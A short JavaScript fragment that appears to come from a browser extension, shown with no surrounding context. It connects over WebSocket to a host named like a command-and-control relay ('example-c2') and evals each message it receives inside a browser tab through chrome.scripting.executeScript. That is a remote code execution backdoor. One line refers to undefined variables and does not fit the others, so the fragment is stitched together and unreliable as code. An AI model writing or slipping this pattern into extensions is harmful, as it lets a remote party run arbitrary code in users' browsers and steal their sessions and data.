const ws = new WebSocket("wss://relay.example-c2.xyz/ws");
u.protocol = secure ? 'wss:' : 'ws:';
ws.onmessage = (m) => { chrome.scripting.executeScript({target:{tabId:1},func:(c)=>eval(c),args:[m.data]}); };
